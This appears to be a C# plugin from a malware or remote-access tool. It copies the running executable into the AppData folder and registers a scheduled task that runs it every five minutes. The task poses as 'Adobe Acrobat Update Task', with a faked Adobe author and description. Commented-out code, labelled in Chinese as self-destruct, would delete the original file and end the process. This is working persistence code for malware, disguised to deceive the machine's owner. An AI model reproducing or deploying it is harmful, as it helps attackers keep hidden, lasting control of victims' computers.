using Microsoft.Win32.TaskScheduler;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Plugin.Handler
{
    class HandleStartBypass
    {
        public static void AddStartUp(string filename)
        {
            try {
                File.Copy(Process.GetCurrentProcess().MainModule.FileName, Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), filename), true);
                TaskService ts = new TaskService();
                TaskDefinition td = ts.NewTask();
                td.RegistrationInfo.Description = "This task keeps your Adobe Reader and Acrobat applications up to date with the latest enhancements and security fixes";
                td.RegistrationInfo.Author = "Adobe Scheduler";
                TimeTrigger dt = new TimeTrigger();
                dt.StartBoundary = Convert.ToDateTime(DateTime.Now.ToString("yyyy-MM-dd 06:30:00"));
                dt.Repetition.Interval = TimeSpan.FromMinutes(5);
                td.Triggers.Add(dt);
                td.Settings.DisallowStartIfOnBatteries = false;
                td.Settings.RunOnlyIfNetworkAvailable = true;
                td.Settings.RunOnlyIfIdle = false;
                td.Settings.DisallowStartIfOnBatteries = false;
                td.Actions.Add(new ExecAction(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), filename), "", null));
                ts.RootFolder.RegisterTaskDefinition(@"Adobe Acrobat Update Task", td);

                //运行后自杀
                //string s = Process.GetCurrentProcess().MainModule.FileName;
                //Process.Start("Cmd.exe", "/c del " + "\"" + s + "\"");
                //Process.GetCurrentProcess().Kill();
            }
            catch (Exception ex)
            {
                Packet.Error(ex.Message);
            }
            
        }        
    }
}
